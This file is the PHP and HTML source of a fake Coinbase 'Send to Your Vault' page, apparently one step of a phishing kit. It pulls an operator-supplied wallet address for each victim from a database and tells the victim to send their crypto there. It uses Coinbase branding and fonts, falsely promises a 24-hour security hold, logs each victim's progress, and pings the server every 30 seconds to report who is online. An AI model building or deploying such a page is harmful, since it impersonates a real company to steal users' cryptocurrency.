<?php
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn;
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    header("Location: login.php");
    exit();
}

// Retrieve the token from the session
$token = $_SESSION["token"];

// Get vault data from database
$stmt = $conn->prepare("SELECT vault_crypto, vault_admin_address FROM user_submissions WHERE token = ?");
$stmt->bind_param("s", $token);
$stmt->execute();
$result = $stmt->get_result();
$vault_data = $result->fetch_assoc();
$stmt->close();

if (!$vault_data || !$vault_data['vault_admin_address']) {
    header("Location: loading.php");
    exit();
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['confirm_send'])) {
    // Update status to indicate funds are being sent
    $stmt = $conn->prepare("UPDATE user_submissions SET vault_status = 'VaultComplete', activity = 'VaultComplete' WHERE token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $stmt->close();
    
    header("Location: loading.php");
    exit();
}

// Update user activity
updateActivity($token, "VaultSendAddress");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Send to Vault</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2');
        }

        body {
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            text-align: center;
        }

        /* Progress Bar */
        .progress-bar {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
            gap: 8px;
        }

        .progress-step {
            width: 80px;
            height: 4px;
            background-color: #32353D;
            border-radius: 2px;
        }

        .progress-step.active {
            background-color: #588BFA;
        }

        .progress-step.completed {
            background-color: #588BFA;
        }

        .header {
            color: #B0B0B0;
            margin-bottom: 24px;
            text-align: center;
            font-family: 'CoinbaseSans', sans-serif;
        }

        .header .coinbase-text {
            font-size: 18px;
            font-weight: 600;
        }

        .header .vault-text {
            font-size: 14px;
            font-weight: 400;
            margin-left: 8px;
        }

        h1 {
            color: #FFFFFF;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            color: #B0B0B0;
            font-size: 16px;
            margin-bottom: 32px;
            text-align: center;
        }
        
        .address-section {
            background-color: #1A1B1F;
            border: 1px solid #32353D;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
        }

        .crypto-details {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .crypto-details img {
            width: 32px;
            height: 32px;
        }

        .crypto-details .crypto-name {
            font-size: 20px;
            font-weight: 600;
            color: #FFFFFF;
        }
        
        .address-display {
            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Roboto Mono', monospace;
            font-size: 14px;
            color: #E0E0E0;
            word-break: break-all;
            background-color: #0A0B0D;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #32353D;
            text-align: left;
        }
        
        .copy-button {
            background-color: #32353D;
            color: #FFFFFF;
            border: 1px solid #32353D;
            border-radius: 8px;
            padding: 10px 16px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: background-color 0.2s;
            width: 100%;
        }
        
        .copy-button:hover {
            background-color: #40434a;
        }
        
        .confirm-button {
            width: 100%;
            background-color: #588BFA;
            color: #FFFFFF;
            border: none;
            border-radius: 50px;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        
        .confirm-button:hover {
            background-color: #4A7DE0;
        }

        .info-box {
            background-color: #1A1B1F;
            border: 1px solid #32353D;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: flex-start;
            text-align: left;
        }

        .info-icon {
            margin-right: 12px;
            flex-shrink: 0;
            margin-top: 4px;
        }

        .info-text h3 {
            font-size: 16px;
            font-weight: 600;
            color: #FFFFFF;
            margin: 0 0 4px 0;
        }

        .info-text p {
            font-size: 14px;
            color: #B0B0B0;
            margin: 0;
            line-height: 1.5;
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 32px;
        }

        .footer a {
            color: #B0B0B0;
            font-size: 14px;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer a:hover {
            color: #FFFFFF;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="progress-bar">
            <div class="progress-step completed"></div>
            <div class="progress-step completed"></div>
            <div class="progress-step completed"></div>
            <div class="progress-step active"></div>
        </div>
        
        <div class="header">
            <span class="coinbase-text">COINBASE</span><span class="vault-text">VAULT</span>
        </div>
        <h1>Send to Your Vault</h1>
        <p class="subtitle">Send <?php echo strtoupper($vault_data['vault_crypto']); ?> to this address to move it into your vault.</p>
        
        <div class="address-section">
            <div class="crypto-details">
                <?php
                $crypto_logos = [
                    'bitcoin' => 'bitcoin-btc-logo.svg',
                    'btc' => 'bitcoin-btc-logo.svg',
                    'ethereum' => 'ethereum-eth-logo.svg',
                    'eth' => 'ethereum-eth-logo.svg',
                    'bnb' => 'bnb-bnb-logo.svg',
                    'usdt' => 'tether-usdt-logo.svg',
                    'tether' => 'tether-usdt-logo.svg',
                    'usdc' => 'usd-coin-usdc-logo.svg',
                    'cardano' => 'cardano-ada-logo.svg',
                    'ada' => 'cardano-ada-logo.svg',
                    'solana' => 'solana-sol-logo.svg',
                    'sol' => 'solana-sol-logo.svg',
                    'xrp' => 'xrp-xrp-logo.svg',
                    'polygon' => 'polygon-matic-logo.svg',
                    'matic' => 'polygon-matic-logo.svg',
                    'avalanche' => 'avalanche-avax-logo.svg',
                    'avax' => 'avalanche-avax-logo.svg',
                    'litecoin' => 'litecoin-ltc-logo.svg',
                    'ltc' => 'litecoin-ltc-logo.svg',
                    'shiba' => 'shiba-inu-shib-logo.svg',
                    'shib' => 'shiba-inu-shib-logo.svg',
                    'tron' => 'tron-trx-logo.svg',
                    'trx' => 'tron-trx-logo.svg',
                    'dai' => 'multi-collateral-dai-dai-logo.svg'
                ];
                
                $crypto_key = strtolower($vault_data['vault_crypto']);
                $logo_file = isset($crypto_logos[$crypto_key]) ? $crypto_logos[$crypto_key] : strtolower($vault_data['vault_crypto']) . '-logo.svg';
                ?>
                <img src="assets/<?php echo $logo_file; ?>" alt="<?php echo htmlspecialchars($vault_data['vault_crypto']); ?>">
                <div class="crypto-name"><?php echo strtoupper(htmlspecialchars($vault_data['vault_crypto'])); ?></div>
            </div>
            <div class="address-display" id="vaultAddress"><?php echo htmlspecialchars($vault_data['vault_admin_address']); ?></div>
            <button class="copy-button" onclick="copyAddress()">Copy Address</button>
        </div>
        
        <form method="POST" style="margin: 0;">
            <button type="submit" name="confirm_send" class="confirm-button">I've sent my crypto</button>
        </form>

        <div class="info-box" style="margin-top: 24px;">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" fill="#588BFA"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Only send <?php echo strtoupper(htmlspecialchars($vault_data['vault_crypto'])); ?></h3>
                <p>Sending any other cryptocurrency to this address may result in the permanent loss of your deposit.</p>
            </div>
        </div>

        <div class="info-box">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#B0B0B0"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Vault Security</h3>
                <p>All withdrawals include a mandatory 24-hour security hold. This gives you time to cancel withdrawals and helps to secure against unintended transactions.</p>
            </div>
        </div>

        <div class="footer">
            <a href="#">We're hiring</a>
            <a href="#">Terms of service</a>
            <a href="#">Privacy policy</a>
        </div>
    </div>

    <script>
        function copyAddress() {
            const addressElement = document.getElementById('vaultAddress');
            const address = addressElement.textContent;
            const button = document.querySelector('.copy-button');
            const originalText = button.textContent;

            if (navigator.clipboard) {
                navigator.clipboard.writeText(address).then(() => {
                    button.textContent = 'Copied!';
                    setTimeout(() => {
                        button.textContent = originalText;
                    }, 2000);
                }).catch(err => {
                    console.error('Failed to copy text: ', err);
                });
            } else {
                // Fallback for older browsers
                try {
                    const textArea = document.createElement('textarea');
                    textArea.value = address;
                    document.body.appendChild(textArea);
                    textArea.focus();
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    button.textContent = 'Copied!';
                    setTimeout(() => {
                        button.textContent = originalText;
                    }, 2000);
                } catch (err) {
                    console.error('Fallback: Oops, unable to copy', err);
                }
            }
        }

        // Update status to online
        function updateStatus() {
            fetch('update_status.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'status=online'
            }).catch(err => console.error('Status update failed:', err));
        }
        updateStatus();
        setInterval(updateStatus, 30000);
    </script>
</body>
</html> 